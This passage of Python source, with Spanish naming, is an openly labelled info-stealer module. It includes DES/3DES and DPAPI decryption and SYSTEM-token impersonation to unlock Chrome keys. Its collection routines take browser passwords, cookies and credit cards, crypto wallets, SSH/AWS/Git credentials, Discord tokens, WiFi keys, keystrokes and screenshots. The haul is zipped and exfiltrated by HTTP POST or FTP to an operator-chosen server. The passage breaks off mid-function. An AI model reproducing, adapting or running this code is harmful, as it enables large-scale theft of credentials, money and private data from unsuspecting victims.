    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
]
_DES_PC1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
            10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
            63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
            14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]
_DES_PC2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4,
            26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40,
            51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]
_DES_SHIFTS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]


def _perm(bits, tabla):
    return [bits[t - 1] for t in tabla]


def _des_subclaves(clave8):
    bits = [(b >> (7 - i)) & 1 for b in clave8 for i in range(8)]
    k = _perm(bits, _DES_PC1)
    c, d = k[:28], k[28:]
    ks = []
    for s in _DES_SHIFTS:
        c = c[s:] + c[:s]
        d = d[s:] + d[:s]
        ks.append(_perm(c + d, _DES_PC2))
    return ks


def _des_f(r, k):
    x = _perm(r, _DES_E)
    x = [a ^ b for a, b in zip(x, k)]
    out = []
    for i in range(8):
        b = x[i * 6:i * 6 + 6]
        fila = (b[0] << 1) | b[5]
        col = (b[1] << 3) | (b[2] << 2) | (b[3] << 1) | b[4]
        v = _DES_S[i][fila * 16 + col]
        out += [(v >> 3) & 1, (v >> 2) & 1, (v >> 1) & 1, v & 1]
    return _perm(out, _DES_P)


def _des_bloque(bits, ks):
    b = _perm(bits, _DES_IP)
    l, r = b[:32], b[32:]
    for k in ks:
        l, r = r, [a ^ c for a, c in zip(l, _des_f(r, k))]
    return _perm(r + l, _DES_FP)


def _bits_a_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits), 8):
        v = 0
        for bit in bits[i:i + 8]:
            v = (v << 1) | bit
        out.append(v)
    return bytes(out)


def _3des_cbc_descifrar(clave24, iv, datos):
    k1 = _des_subclaves(clave24[0:8])
    k2 = _des_subclaves(clave24[8:16])
    k3 = _des_subclaves(clave24[16:24])
    prev = [(b >> (7 - i)) & 1 for b in iv for i in range(8)]
    out = bytearray()
    for i in range(0, len(datos), 8):
        blk = datos[i:i + 8]
        if len(blk) < 8:
            blk = blk + b"\x00" * (8 - len(blk))
        bits = [(b >> (7 - j)) & 1 for b in blk for j in range(8)]
        d3 = _des_bloque(bits, list(reversed(k3)))
        e2 = _des_bloque(d3, k2)
        d1 = _des_bloque(e2, list(reversed(k1)))
        out += _bits_a_bytes([a ^ b for a, b in zip(d1, prev)])
        prev = bits
    if out and 0 < out[-1] <= 8:
        n = out[-1]
        if out[-n:] == bytes([n]) * n:
            out = out[:-n]
    return bytes(out)


# ================================= DPAPI ====================================
def _dpapi(blob, entropy=None):
    if not blob:
        return b""
    try:
        import ctypes
        from ctypes import wintypes

        class _BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        def _mk(datos):
            buf = ctypes.create_string_buffer(bytes(datos), len(datos))
            return _BLOB(len(datos), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf

        bi, _b1 = _mk(blob)
        if entropy:
            be, _b2 = _mk(entropy)
            pbe = ctypes.byref(be)
        else:
            pbe = None
        bo = _BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, pbe, None, None, 0, ctypes.byref(bo))
        if not ok:
            return b""
        try:
            return ctypes.string_at(bo.pbData, bo.cbData)
        finally:
            try:
                ctypes.windll.kernel32.LocalFree(bo.pbData)
            except Exception:
                pass
    except Exception:
        return b""


def _pid_de(nombre):
    try:
        r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + nombre,
                            "/NH", "/FO", "CSV"],
                           capture_output=True, text=True, **_sin_consola())
        for ln in (r.stdout or "").splitlines():
            partes = [p.strip('"') for p in ln.split('","')]
            if len(partes) >= 2 and partes[0].lower() == nombre.lower():
                return int(partes[1])
    except Exception:
        pass
    return None


def _como_system(fn):
    """Ejecuta fn() con el token de SYSTEM (necesario para claves v20 de Chrome)."""
    try:
        import ctypes
        from ctypes import wintypes
        k = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32
        pid = _pid_de("winlogon.exe")
        if not pid:
            return None
        hproc = k.OpenProcess(0x0400, False, pid)
        if not hproc:
            return None
        htok = wintypes.HANDLE()
        if not adv.OpenProcessToken(hproc, 0x0002 | 0x0008, ctypes.byref(htok)):
            k.CloseHandle(hproc)
            return None
        hdub = wintypes.HANDLE()
        ok = adv.DuplicateTokenEx(htok, 0x0002 | 0x0008 | 0x0001 | 0x0004,
                                  None, 2, 1, ctypes.byref(hdub))
        try:
            if not ok:
                return None
            adv.ImpersonateLoggedOnUser(hdub)
            try:
                return fn()
            finally:
                adv.RevertToUser()
        finally:
            for h in (htok, hdub, hproc):
                try:
                    k.CloseHandle(h)
                except Exception:
                    pass
    except Exception:
        return None


# ================================= STEALER ==================================
DIR_STEAL = os.path.join(DIR_PERSIST, "stealer")
_STEAL = {"activo": False, "prog": 0, "fase": "idle", "error": None,
          "resumen": None, "zip": None, "auto": False, "url": "",
          "intervalo": 900, "ultimo": 0.0}


def _texto(b):
    if isinstance(b, str):
        return b
    try:
        return b.decode("utf-8", "replace")
    except Exception:
        return ""


def _escribir(ruta, texto):
    try:
        os.makedirs(os.path.dirname(ruta), exist_ok=True)
        modo = "wb" if isinstance(texto, (bytes, bytearray)) else "w"
        with open(ruta, modo, **({} if modo == "wb" else {"encoding": "utf-8"})) as f:
            f.write(texto)
    except Exception:
        pass


def _copia_temp(ruta):
    global _TEMP_STEAL
    if not os.path.isfile(ruta):
        return None
    if _TEMP_STEAL is None:
        _TEMP_STEAL = tempfile.mkdtemp(prefix="jaguar_st_")
    dst = os.path.join(_TEMP_STEAL, f"{abs(hash(ruta))}.db")
    try:
        shutil.copy2(ruta, dst)
        for suf in ("-wal", "-shm"):
            if os.path.isfile(ruta + suf):
                try:
                    shutil.copy2(ruta + suf, dst + suf)
                except Exception:
                    pass
        return dst
    except Exception:
        return None


def _sqlite(ruta, sql, args=()):
    copia = _copia_temp(ruta)
    if not copia:
        return []
    try:
        con = sqlite3.connect(copia, timeout=3)
        try:
            return con.execute(sql, args).fetchall()
        finally:
            con.close()
    except Exception:
        return []


def _limpiar_temp_steal():
    global _TEMP_STEAL
    if _TEMP_STEAL and os.path.isdir(_TEMP_STEAL):
        shutil.rmtree(_TEMP_STEAL, ignore_errors=True)
    _TEMP_STEAL = None


# --------------------------- navegadores ------------------------------------
def _rutas_cromo():
    la = os.environ.get("LOCALAPPDATA", "")
    ra = os.environ.get("APPDATA", "")
    return [
        ("Chrome", os.path.join(la, r"Google\Chrome\User Data")),
        ("Chrome Beta", os.path.join(la, r"Google\Chrome Beta\User Data")),
        ("Edge", os.path.join(la, r"Microsoft\Edge\User Data")),
        ("Brave", os.path.join(la, r"BraveSoftware\Brave-Browser\User Data")),
        ("Opera", os.path.join(ra, r"Opera Software\Opera Stable")),
        ("Opera GX", os.path.join(ra, r"Opera Software\Opera GX Stable")),
        ("Vivaldi", os.path.join(la, r"Vivaldi\User Data")),
        ("Chromium", os.path.join(la, r"Chromium\User Data")),
        ("Yandex", os.path.join(la, r"Yandex\YandexBrowser\User Data")),
        ("Avast", os.path.join(la, r"AVAST Software\Browser\User Data")),
        ("AVG", os.path.join(la, r"AVG\Browser\User Data")),
    ]


def _perfiles_cromo(raiz):
    if os.path.isfile(os.path.join(raiz, "Local State")):
        return ["."]
    out = []
    try:
        for n in os.listdir(raiz):
            p = os.path.join(raiz, n)
            if os.path.isdir(p) and (n == "Default" or n.startswith("Profile ")
                                     or n in ("Guest Profile", "System Profile")):
                out.append(n)
    except Exception:
        pass
    return out or ["Default"]


def _cromo_clave(raiz):
    try:
        with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
            j = json.load(f)
        b64 = j["os_crypt"]["encrypted_key"]
        blob = base64.b64decode(b64)
        if blob[:5] == b"DPAPI":
            blob = blob[5:]
        return _dpapi(blob)
    except Exception:
        return None


def _cromo_clave20(raiz):
    try:
        with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
            j = json.load(f)
        b64 = j["os_crypt"].get("app_bound_encrypted_key")
        if not b64:
            return None
        blob = base64.b64decode(b64)
        if blob[:4] == b"APPB":
            blob = blob[4:]
        interno = _como_system(lambda: _dpapi(blob))
        if not interno:
            return None
        return _dpapi(interno)
    except Exception:
        return None


def _descifrar_valor(blob, clave, clave20=None):
    if not blob:
        return b""
    if isinstance(blob, str):
        blob = blob.encode("latin-1", "ignore")
    try:
        if blob[:3] in (b"v10", b"v11"):
            return _aes_gcm_descifrar(clave, blob[3:15], blob[15:])
        if blob[:3] == b"v20":
            pt = _aes_gcm_descifrar(clave20 or clave, blob[3:15], blob[15:])
            return pt[32:] if len(pt) > 32 else pt
    except Exception:
        pass
    try:
        return _dpapi(blob)
    except Exception:
        return b""


def _col_navegadores(base):
    salida = os.path.join(base, "Navegadores")
    cont = {"perfiles": 0, "passwords": 0, "cookies": 0, "autofill": 0,
            "tarjetas": 0, "historial": 0, "bookmarks": 0}
    for nav, raiz in _rutas_cromo():
        if not os.path.isdir(raiz):
            continue
        clave = _cromo_clave(raiz)
        clave20 = _cromo_clave20(raiz)
        for perfil in _perfiles_cromo(raiz):
            pdir = os.path.join(raiz, perfil)
            if not os.path.isdir(pdir):
                continue
            d = os.path.join(salida, nav, perfil.replace(".", "default"))
            cont["perfiles"] += 1

            filas = _sqlite(os.path.join(pdir, "Login Data"),
                            "SELECT origin_url, username_value, password_value FROM logins")
            if filas:
                lineas = []
                for url, usr, pwd in filas:
                    p = _texto(_descifrar_valor(pwd, clave, clave20))
                    lineas.append(f"URL: {url}\nUsuario: {usr}\nPassword: {p}\n")
                    cont["passwords"] += 1
                _escribir(os.path.join(d, "passwords.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "Cookies"),
                            "SELECT host_key, name, encrypted_value FROM cookies")
            if filas:
                lineas = []
                for host, nombre, val in filas:
                    v = _texto(_descifrar_valor(val, clave, clave20))
                    lineas.append(f"{host}\t{nombre}\t{v}")
                    cont["cookies"] += 1
                _escribir(os.path.join(d, "cookies.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "Web Data"),
                            "SELECT name, value FROM autofill")
            if filas:
                _escribir(os.path.join(d, "autofill.txt"),
                          "\n".join(f"{n} = {v}" for n, v in filas))
                cont["autofill"] += len(filas)

            filas = _sqlite(os.path.join(pdir, "Web Data"),
                            "SELECT name_on_card, expiration_month, expiration_year,"
                            " card_number_encrypted FROM credit_cards")
            if filas:
                lineas = []
                for nom, mm, aa, num in filas:
                    n = _texto(_descifrar_valor(num, clave, clave20))
                    lineas.append(f"Titular: {nom}\nNumero: {n}\nCaduca: {mm}/{aa}\n")
                    cont["tarjetas"] += 1
                _escribir(os.path.join(d, "tarjetas.txt"), "\n".join(lineas))

            filas = _sqlite(os.path.join(pdir, "History"),
                            "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 300")
            if filas:
                _escribir(os.path.join(d, "historial.txt"),
                          "\n".join(f"{u}\t{t}" for u, t in filas))
                cont["historial"] += len(filas)

            bm = os.path.join(pdir, "Bookmarks")
            if os.path.isfile(bm):
                try:
                    shutil.copy2(bm, os.path.join(d, "bookmarks.json"))
                    cont["bookmarks"] += 1
                except Exception:
                    pass

    _ff = _col_firefox(base)
    for k in cont:
        cont[k] += _ff.get(k, 0)
    return cont


def _der_items(blob):
    try:
        if not blob:
            return []
        if blob[0] == 0x04 and len(blob) > 2:
            l = blob[1]
            blob = blob[2:2 + l]
        if blob[0] != 0x30:
            return []
        i = 1
        l = blob[i]
        i += 1
        if l & 0x80:
            n = l & 0x7F
            l = int.from_bytes(blob[i:i + n], "big")
            i += n
        fin = i + l
        items = []
        while i < fin and blob[i] == 0x04:
            i += 1
            l = blob[i]
            i += 1
            if l & 0x80:
                n = l & 0x7F
                l = int.from_bytes(blob[i:i + n], "big")
                i += n
            items.append(blob[i:i + l])
            i += l
        return items
    except Exception:
        return []


def _ff_clave(pdir):
    kdb = os.path.join(pdir, "key4.db")
    if not os.path.isfile(kdb):
        return None
    copia = _copia_temp(kdb)
    if not copia:
        return None
    try:
        con = sqlite3.connect(copia, timeout=3)
        try:
            g = con.execute("SELECT item1 FROM metaData WHERE id='2'").fetchone()
            a11 = con.execute("SELECT a11 FROM nssPrivate LIMIT 1").fetchone()
        finally:
            con.close()
        if not (g and a11):
            return None
        salt_global = g[0]
        hp = hashlib.sha1(salt_global + b"").digest()
        items = _der_items(a11[0])
        if len(items) < 3:
            return None
        e_salt, iv, ct = items[0], items[1], items[2]
        clave = hashlib.pbkdf2_hmac("sha256", hp, e_salt, 1, 32)
        dec = _aes_cbc_descifrar(clave, iv, ct)
        if len(dec) < 4:
            return None
        n = int.from_bytes(dec[2:4], "big")
        if not (0 < n <= 32) or len(dec) < 4 + n:
            n = len(dec) - 4
        return dec[4:4 + n]
    except Exception:
        return None


def _col_firefox(base):
    cont = {"perfiles": 0, "passwords": 0, "cookies": 0, "historial": 0}
    raiz = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(raiz):
        return cont
    for perfil in os.listdir(raiz):
        pdir = os.path.join(raiz, perfil)
        if not os.path.isdir(pdir):
            continue
        cont["perfiles"] += 1
        d = os.path.join(base, "Navegadores", "Firefox", perfil)
        clave = _ff_clave(pdir)
        logins = os.path.join(pdir, "logins.json")
        if clave and os.path.isfile(logins):
            try:
                with open(logins, encoding="utf-8") as f:
                    j = json.load(f)
                lineas = []
                for lg in j.get("logins", []):
                    enc = lg.get("encrypted")
                    if not enc:
                        continue
                    items = _der_items(base64.b64decode(enc))
                    if len(items) < 2:
                        continue
                    iv, ct = items[-2], items[-1]
                    if len(clave) == 24:
                        pwd = _3des_cbc_descifrar(clave, iv, ct)
                    else:
                        pwd = _aes_cbc_descifrar(clave, iv, ct)
                    lineas.append(f"URL: {lg.get('hostname')}\n"
                                  f"Usuario: {lg.get('usernameField', '')}\n"
                                  f"Password: {_texto(pwd)}\n")
                    cont["passwords"] += 1
                if lineas:
                    _escribir(os.path.join(d, "passwords.txt"), "\n".join(lineas))
            except Exception:
                pass
        for nom, sql, cam in (
                ("cookies.txt", "SELECT host, name, value FROM moz_cookies", 3),
                ("historial.txt", "SELECT url, title FROM moz_places LIMIT 300", 2)):
            filas = _sqlite(os.path.join(pdir, "cookies.sqlite" if "cookie" in nom
                                         else "places.sqlite"), sql)
            if filas:
                _escribir(os.path.join(d, nom),
                          "\n".join("\t".join(str(x) for x in fila) for fila in filas))
                cont["cookies" if "cookie" in nom else "historial"] += len(filas)
    return cont


# ------------------------------ wallets -------------------------------------
_IDS_EXT = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
    "ibnejdfjmmkpcnlpebgbjaanbjbbbabb": "TronLink",
    "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
    "aholpfdialjgjfhomihjawabnklbfce": "Terra",
    "fhmfendgdocmcbmfikdcogofphimnkno": "Sollet",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
}


def _col_wallets(base):
    cont = {"extensiones": 0, "escritorio": 0}
    la = os.environ.get("LOCALAPPDATA", "")
    ra = os.environ.get("APPDATA", "")
    perfiles = []
    for _, raiz in _rutas_cromo():
        if os.path.isdir(raiz):
            for p in _perfiles_cromo(raiz):
                perfiles.append(os.path.join(raiz, p))
    for pdir in perfiles:
        ext = os.path.join(pdir, "Local Extension Settings")
        if not os.path.isdir(ext):
            continue
        for idext, nombre in _IDS_EXT.items():
            origen = os.path.join(ext, idext)
            if os.path.isdir(origen):
                destino = os.path.join(base, "Wallets", "extensiones", nombre)
                try:
                    shutil.copytree(origen, destino, dirs_exist_ok=True)
                    cont["extensiones"] += 1
                except Exception:
                    pass

    escritorio = {
        "Exodus": os.path.join(ra, r"Exodus\exodus.wallet"),
        "Electrum": os.path.join(ra, r"Electrum\wallets"),
        "Ethereum": os.path.join(ra, r"Ethereum\keystore"),
        "Atomic": os.path.join(ra, r"atomic\Local Storage\leveldb"),
        "Coinomi": os.path.join(ra, r"Coinomi\Coinomi\wallets"),
        "Binance": os.path.join(ra, r"Binance"),
        "TronLink": os.path.join(ra, r"TronLink"),
        "Monero": os.path.join(os.path.expanduser("~"), "Monero", "wallets"),
        "Guarda": os.path.join(ra, r"Guarda"),
        "Zcash": os.path.join(ra, r"Zcash"),
    }
    for nombre, ruta in escritorio.items():
        if os.path.isdir(ruta):
            try:
                shutil.copytree(ruta, os.path.join(base, "Wallets", nombre),
                                dirs_exist_ok=True)
                cont["escritorio"] += 1
            except Exception:
                pass
    return cont


# -------------------------------- apps --------------------------------------
def _col_apps(base):
    cont = {"archivos": 0}
    ra = os.environ.get("APPDATA", "")
    up = os.path.expanduser("~")

    pares = [
        ("FileZilla/recentservers.xml", os.path.join(ra, r"FileZilla\recentservers.xml")),
        ("FileZilla/sitemanager.xml", os.path.join(ra, r"FileZilla\sitemanager.xml")),
        ("WinSCP/WinSCP.ini", os.path.join(ra, "WinSCP.ini")),
        ("OpenVPN", os.path.join(ra, r"OpenVPN Connect\profiles")),
        ("WireGuard", os.path.join(up, "WireGuard")),
        ("SSH", os.path.join(up, ".ssh")),
        ("Git/gitconfig", os.path.join(up, ".gitconfig")),
        ("Git/credentials", os.path.join(up, ".git-credentials")),
        ("AWS/credentials", os.path.join(up, r".aws\credentials")),
        ("Docker/config.json", os.path.join(up, r".docker\config.json")),
        ("NordVPN", os.path.join(ra, "NordVPN")),
        ("ProtonVPN", os.path.join(ra, "ProtonVPN")),
        ("Slack", os.path.join(ra, "Slack")),
        ("Teams", os.path.join(ra, r"Microsoft\Teams")),
        ("Telegram/tdata", os.path.join(ra, r"Telegram Desktop\tdata")),
    ]
    for nombre, ruta in pares:
        if os.path.isdir(ruta):
            try:
                shutil.copytree(ruta, os.path.join(base, "Apps", nombre),
                                dirs_exist_ok=True)
                cont["archivos"] += 1
            except Exception:
                pass
        elif os.path.isfile(ruta):
            _escribir(os.path.join(base, "Apps", nombre),
                      open(ruta, "rb").read())
            cont["archivos"] += 1

    # PuTTY (registro)
    try:
        import winreg
        lineas = []
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\SimonTatham\PuTTY\Sessions")
            n = winreg.QueryInfoKey(k)[0]
            for i in range(n):
                sub = winreg.EnumKey(k, i)
                lineas.append(f"[{sub}]")
                try:
                    sk = winreg.OpenKey(k, sub)
                    for j in range(winreg.QueryInfoKey(sk)[1]):
                        nom, val, _ = winreg.EnumValue(sk, j)
                        if nom in ("HostName", "UserName", "PortNumber"):
                            lineas.append(f"  {nom} = {val}")
                except Exception:
                    pass
            winreg.CloseKey(k)
        except Exception:
            pass
        if lineas:
            _escribir(os.path.join(base, "Apps", "PuTTY_sesiones.txt"),
                      "\n".join(lineas))
            cont["archivos"] += 1
    except Exception:
        pass

    # Discord token (leveldb)
    try:
        import re
        for nombre, ruta in (("Discord", os.path.join(ra, r"discord\Local Storage\leveldb")),
                             ("DiscordPTB", os.path.join(ra, r"discordptb\Local Storage\leveldb")),
                             ("DiscordCanary", os.path.join(ra, r"discordcanary\Local Storage\leveldb"))):
            if not os.path.isdir(ruta):
                continue
            tokens = set()
            for a in os.listdir(ruta):
                if not a.endswith((".ldb", ".log")):
                    continue
                try:
                    crudo = open(os.path.join(ruta, a), "rb").read()
                    for m in re.findall(rb"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,110}", crudo):
                        tokens.add(m.decode("latin-1", "ignore"))
                except Exception:
                    pass
            if tokens:
                _escribir(os.path.join(base, "Apps", f"{nombre}_token.txt"),
                          "\n".join(sorted(tokens)))
                cont["archivos"] += 1
    except Exception:
        pass

    # Steam
    try:
        for prog in (os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
                     os.environ.get("ProgramFiles", r"C:\Program Files")):
            cfg = os.path.join(prog, "Steam", "config")
            if os.path.isdir(cfg):
                for a in ("loginusers.vdf", "config.vdf"):
                    p = os.path.join(cfg, a)
                    if os.path.isfile(p):
                        _escribir(os.path.join(base, "Apps", "Steam", a),
                                  open(p, "rb").read())
                        cont["archivos"] += 1
                for a in os.listdir(prog + r"\Steam"):
                    if a.startswith("ssfn"):
                        try:
                            shutil.copy2(os.path.join(prog, "Steam", a),
                                         os.path.join(base, "Apps", "Steam", a))
                            cont["archivos"] += 1
                        except Exception:
                            pass
                break
    except Exception:
        pass
    return cont


# ------------------------------ sistema -------------------------------------
def _col_wifi(base):
    cont = {"redes": 0}
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"],
                           capture_output=True, text=True, **_sin_consola())
        nombres = []
        for ln in (r.stdout or "").splitlines():
            if ":" in ln and ("perfil" in ln.lower() or "profile" in ln.lower()):
                nombres.append(ln.split(":", 1)[1].strip())
        lineas = []
        for nom in nombres:
            try:
                r2 = subprocess.run(["netsh", "wlan", "show", "profile",
                                     f"name={nom}", "key=clear"],
                                    capture_output=True, text=True, **_sin_consola())
                clave = ""
                for ln in (r2.stdout or "").splitlines():
                    if ":" in ln and ("clave" in ln.lower() or "key content" in ln.lower()):
                        clave = ln.split(":", 1)[1].strip()
                        break
                lineas.append(f"{nom}\t{clave}")
                cont["redes"] += 1
            except Exception:
                pass
        if lineas:
            _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
    except Exception:
        pass
    return cont


def _col_sistema(base):
    cont = {"items": 0}
    try:
        info = _sysinfo()
        info["usuario_dominio"] = f"{os.environ.get('USERDOMAIN', '')}\\{_usuario()}"
        _escribir(os.path.join(base, "Sistema", "info.txt"),
                  json.dumps(info, indent=2, ensure_ascii=False))
        cont["items"] += 1
    except Exception:
        pass
    try:
        _escribir(os.path.join(base, "Sistema", "entorno.txt"),
                  "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items())))
        cont["items"] += 1
    except Exception:
        pass
    try:
        r = subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
        _escribir(os.path.join(base, "Sistema", "procesos.txt"), r.stdout or "")
        cont["items"] += 1
    except Exception:
        pass
    try:
        lineas = []
        for ruta, vista in ((r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0),
                            (r"SOFTWARE\WOW6432Node\Microsoft\Windows"
                             r"\CurrentVersion\Uninstall", 0)):
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sub = winreg.EnumKey(k, i)
                        sk = winreg.OpenKey(k, sub)
                        nom = winreg.QueryValueEx(sk, "DisplayName")[0]
                        ver = ""
                        try:
                            ver = winreg.QueryValueEx(sk, "DisplayVersion")[0]
                        except Exception:
                            pass
                        lineas.append(f"{nom} {ver}")
                    except Exception:
                        pass
            except Exception:
                pass
        if lineas:
            _escribir(os.path.join(base, "Sistema", "programas.txt"),
                      "\n".join(sorted(set(lineas))))
            cont["items"] += 1
    except Exception:
        pass
    try:
        t = _clip_get({}).get("texto", "")
        if t:
            _escribir(os.path.join(base, "Sistema", "portapapeles.txt"), t)
            cont["items"] += 1
    except Exception:
        pass
    return cont


def _col_pantalla(base):
    try:
        datos = _captura({"formato": "jpeg", "calidad": 70, "escala": 1.0})
        if datos.get("b64"):
            _escribir(os.path.join(base, "Sistema", "pantalla.jpg"),
                      base64.b64decode(datos["b64"]))
            return {"pantalla": 1}
    except Exception:
        pass
    return {}


def _col_keylog(base):
    try:
        texto = "".join(_KLOG)
        if texto:
            _escribir(os.path.join(base, "teclas.txt"), texto)
            return {"teclas": len(texto)}
    except Exception:
        pass
    return {}


# --------------------------- orquestacion -----------------------------------
def _stealer_recolectar(a):
    if _STEAL["activo"]:
        return {"estado": "ya en curso", "fase": _STEAL["fase"]}
    op = {
        "navegadores": bool(a.get("navegadores", True)),
        "apps": bool(a.get("apps", True)),
        "wallets": bool(a.get("wallets", True)),
        "sistema": bool(a.get("sistema", True)),
        "wifi": bool(a.get("wifi", True)),
        "keylog": bool(a.get("keylog", True)),
        "screenshot": bool(a.get("screenshot", True)),
        "url": a.get("url", _STEAL["url"]),
    }
    _STEAL.update({"activo": True, "prog": 0, "fase": "iniciando", "error": None})
    threading.Thread(target=_stealer_trabajo, args=(op,), daemon=True).start()
    return {"estado": "iniciado"}


def _stealer_trabajo(op):
    res = {}
    try:
        sello = time.strftime("%Y%m%d_%H%M%S")
        base = os.path.join(DIR_STEAL, sello)
        os.makedirs(base, exist_ok=True)
        pasos = []
        if op["navegadores"]:
            pasos.append(("navegadores", _col_navegadores))
        if op["apps"]:
            pasos.append(("aplicaciones", _col_apps))
        if op["wallets"]:
            pasos.append(("wallets", _col_wallets))
        if op["sistema"]:
            pasos.append(("sistema", _col_sistema))
        if op["wifi"]:
            pasos.append(("wifi", _col_wifi))
        if op["keylog"]:
            pasos.append(("teclas", _col_keylog))
        if op["screenshot"]:
            pasos.append(("pantalla", _col_pantalla))
        total = max(1, len(pasos))
        for i, (nombre, fn) in enumerate(pasos):
            _STEAL["fase"] = nombre
            _STEAL["prog"] = int(i / total * 90)
            try:
                res[nombre] = fn(base) or {}
            except Exception as e:
                res[nombre] = {"error": str(e)}
        _STEAL["fase"] = "empaquetando"
        _STEAL["prog"] = 95
        _escribir(os.path.join(base, "resumen.json"), json.dumps(
            {"fecha": time.strftime("%Y-%m-%d %H:%M:%S"), "equipo": _sysinfo(),
             "res": res}, indent=2, ensure_ascii=False))
        zipruta = base + ".zip"
        with zipfile.ZipFile(zipruta, "w", zipfile.ZIP_DEFLATED) as z:
            for raiz, _, archivos in os.walk(base):
                for a in archivos:
                    p = os.path.join(raiz, a)
                    z.write(p, os.path.relpath(p, os.path.dirname(base)))
        tam = os.path.getsize(zipruta)
        _STEAL.update({"activo": False, "prog": 100, "fase": "listo",
                       "resumen": {"res": res, "ruta": base, "zip": zipruta,
                                   "tamano": tam},
                       "zip": zipruta, "ultimo": time.time()})
        _log("STEAL", f"paquete listo {zipruta} ({tam} bytes)")
        url = op.get("url") or _STEAL.get("url")
        if url:
            _stealer_exfil({"url": url})
    except Exception as e:
        _STEAL.update({"activo": False, "fase": "error", "error": str(e)})
        _log("STEAL", f"error: {e}")
    finally:
        _limpiar_temp_steal()


def _stealer_estado(a):
    return {"activo": _STEAL["activo"], "prog": _STEAL["prog"],
            "fase": _STEAL["fase"], "error": _STEAL["error"],
            "zip": _STEAL["zip"], "auto": _STEAL["auto"],
            "resumen": _STEAL["resumen"]}


def _stealer_paquete(a):
    ruta = _STEAL.get("zip")
    if not ruta or not os.path.isfile(ruta):
        return {"error": "no hay paquete; ejecuta stealer_recolectar"}
    with open(ruta, "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(ruta), "tamano": len(d),
            "b64": base64.b64encode(d).decode()}


def _http_subir(url, ruta):
    import urllib.request
    import uuid
    with open(ruta, "rb") as f:
        datos = f.read()
    lim = uuid.uuid4().hex
    nombre = os.path.basename(ruta)
    cuerpo = (f"--{lim}\r\nContent-Disposition: form-data; name=\"file\"; "
              f"filename=\"{nombre}\"\r\nContent-Type: application/zip\r\n\r\n"
              ).encode() + datos + f"\r\n--{lim}--\r\n".encode()
    req = urllib.request.Request(
        url, data=cuerpo, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={lim}",
                 "User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.status


def _ftp_subir(host, usuario, clave, ruta, carpeta=""):
    import ftplib
    with ftplib.FTP(host, timeout=45) as f:
        f.login(usuario or "anonymous", clave or "")
        if carpeta:
            try:
                f.cwd(carpeta)
            except Exception:
                pass
        with open(ruta, "rb") as fh:
            f.storbinary("STOR " + os.path.basename(ruta), fh)
    return 226


def _stealer_exfil(a):
    ruta = a.get("ruta") or _STEAL.get("zip")
    if not ruta or not os.path.isfile(ruta):
        return {"error": "no hay paquete para exfiltrar"}
    tipo = (a.get("tipo") or ("ftp" if a.get("host") else "http")).lower()
    try:
        if tipo == "ftp":
            estado = _ftp_subir(a.get("host", ""), a.get("usuario", ""),
                                a.get("clave", ""), ruta, a.get("carpeta", ""))
        elif tipo == "ruta":
            destino = a.get("destino", "")
            os.makedirs(destino, exist_ok=True)
            shutil.copy2(ruta, os.path.join(destino, os.path.basename(ruta)))
            estado = "copiado"
        else:
            url = a.get("url") or _STEAL.get("url")
            if not url:
                return {"error": "falta url"}
            estado = _http_subir(url, ruta)
        _log("STEAL", f"exfiltrado ({tipo}) -> {estado}")
        return {"ok": True, "tipo": tipo, "estado": estado,
                "archivo": os.path.basename(ruta)}
    except Exception as e:
        _log("STEAL", f"exfil error: {e}")
        return {"error": str(e)}


def _stealer_auto(a):
    if "url" in a:
